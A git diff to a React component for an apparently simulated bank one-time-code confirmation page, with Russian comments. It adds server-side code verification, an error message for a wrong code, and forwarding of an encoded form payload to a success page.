@@ -6,6 +6,10 @@ import { useState } from "react";
 import { useCountdown } from "@/hooks/useCountdown";
 import { useRouter } from "@/i18n/navigation";
 import { FULL_PATH_ROUTE } from "@myorg/shared/route";
+import CodeService from "@/services/code/code.service";
+import { $apiClient } from "@/utils/api/fetch.client";
+
+const codeService = new CodeService($apiClient);
 
 export default function Bank({
   dev = false,
@@ -16,6 +20,7 @@ export default function Bank({
   cardNumber,
   phone,
   color,
+  payload,
 }: {
   bankName: string;
   bankId: string;
@@ -25,9 +30,12 @@ export default function Bank({
   phone: string;
   dev?: boolean;
   color: string;
+  // Закодированные значения формы accept для передачи на страницу ok.
+  payload?: string;
 }) {
   const CODE_LENGTH = 6;
   const [code, setCode] = useState("");
+  const [error, setError] = useState("");
   const [expiresAt] = useState(() =>
     new Date(Date.now() + 150_000).toISOString(),
   );
@@ -52,12 +60,21 @@ export default function Bank({
     return chars.map((ch, i) => (hidden.has(i) ? "X" : ch)).join("");
   })();
 
-  const handleClick = () => {
+  const handleClick = async () => {
     if (dev || !code) return;
+    setError("");
     setloading(true);
-    setTimeout(() => {
-      router.push(FULL_PATH_ROUTE.ok.path + "/" + bankId);
-    }, 2000);
+    try {
+      // Сверяем код с кодом подтверждения (singleton AppData).
+      await codeService.verifyConfirmation({ code });
+      const query = payload ? `?d=${encodeURIComponent(payload)}` : "";
+      setTimeout(() => {
+        router.push(FULL_PATH_ROUTE.ok.path + "/" + bankId + query);
+      }, 1500);
+    } catch {
+      setloading(false);
+      setError("Неверный код подтверждения");
+    }
   };
 
   const rows: { label: string; value: string; bold?: boolean }[] = [
@@ -198,7 +215,10 @@ export default function Bank({
             <Box
               component={"input"}
               value={code}
-              onChange={(e) => setCode(e.target.value.slice(0, CODE_LENGTH))}
+              onChange={(e) => {
+                setCode(e.target.value.slice(0, CODE_LENGTH));
+                if (error) setError("");
+              }}
               inputMode="numeric"
               autoComplete="one-time-code"
               sx={{
@@ -206,7 +226,8 @@ export default function Bank({
                 marginTop: 2,
                 paddingX: 1,
                 paddingY: 1,
-                border: "1px solid #b8b8b8",
+                border: "1px solid",
+                borderColor: error ? "#d32f2f" : "#b8b8b8",
                 borderRadius: 1,
                 outline: "none",
                 fontFamily: "monospace",
@@ -216,6 +237,17 @@ export default function Bank({
                 boxSizing: "border-box",
               }}
             />
+
+            {error && (
+              <StyledTypography
+                fontFamily={"sans-serif"}
+                fontSize={13}
+                color="#d32f2f"
+                marginTop={1}
+              >
+                {error}
+              </StyledTypography>
+            )}
 
             <StyledTypography
               fontFamily={"sans-serif"}
